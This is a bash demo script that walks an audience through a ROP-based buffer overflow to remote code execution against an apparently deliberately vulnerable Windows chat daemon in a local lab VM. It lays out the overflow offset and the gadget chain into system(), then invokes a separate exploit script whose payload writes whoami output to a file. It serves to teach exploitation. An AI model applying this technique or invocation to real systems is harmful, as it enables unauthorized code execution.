#!/bin/bash
# buffer overflow -> RCE demo. press enter to advance each step.
# if you're recording in OBS, have winview.sh up in the other terminal
# so the audience sees pwned.txt appear on the windows desktop.
cd "$(dirname "$0")/.."

VM_IP="192.168.121.32"

wait_key() { echo ""; read -rp "  [enter] "; }

clear
cat <<'BANNER'

  binex-vulnchat: buffer overflow -> RCE via ROP (windows)
  --------------------------------------------------------

  target     chatd.exe on Windows Server 2022
  binary     64-bit PE, no ASLR, no canary, DEP, no CFG
  vuln       cmd_nick: memcpy into char tmp[64], no bounds check
  primitive  saved RIP at offset 72 from buffer start
  chain      write-what-where via ucrtbase.dll gadgets -> system()
  payload    whoami > C:\chatd\pwned.txt

BANNER

wait_key

echo "  confirming target is up..."
echo ""
vagrant winrm win -c '
Write-Host "  hostname:  $(hostname)"
$p = Get-Process chatd
Write-Host "  chatd.exe: PID $($p.Id), listening on 4002"
Write-Host ""
if (Test-Path C:\chatd\pwned.txt) { Write-Host "  pwned.txt: exists (stale)" }
else { Write-Host "  pwned.txt: does not exist" }
' 2>/dev/null

wait_key

echo "  DLL bases (ASLR is per-boot, consistent within a boot):"
echo ""
echo "  chatd.exe     0x0000000140000000  (no ASLR, fixed)"
vagrant winrm win -c '
$p = Get-Process chatd
$m = $p.Modules | Where-Object { $_.ModuleName -eq "ucrtbase.dll" }
$base = "0x{0:X}" -f [Int64]$m.BaseAddress
Write-Host "  ucrtbase.dll  $base  (ASLR, this boot)"
' 2>/dev/null
echo ""
echo "  gadgets from ucrtbase.dll:"
echo "    pop rax; ret         write value into rax"
echo "    pop rcx; ret         write destination into rcx"
echo "    mov [rcx], rax; ret  write-what-where primitive"
echo "    system()             code execution target"

wait_key

echo "  sending exploit..."
echo ""

python3 exploits/chat_win_cmd_overflow.py \
  --host $VM_IP --port 4002 \
  --auth-host 127.0.0.1 --auth-port 4001 \
  --ucrt-base 0x7FFEAE740000 \
  --profile ws2022_ucrt \
  --cmd "whoami > C:\\chatd\\pwned.txt"

wait_key

echo "  checking target for evidence..."
echo ""
vagrant winrm win -c '
if (Test-Path C:\chatd\pwned.txt) {
    Write-Host "  pwned.txt found on target"
    Write-Host ""
    $who = Get-Content C:\chatd\pwned.txt
    Write-Host "  contents: $who"
    Write-Host ""
    Write-Host "  system() ran whoami as $who"
} else {
    Write-Host "  pwned.txt not found"
}
' 2>/dev/null

echo ""
echo "  done. arbitrary command execution via ROP chain."
echo ""
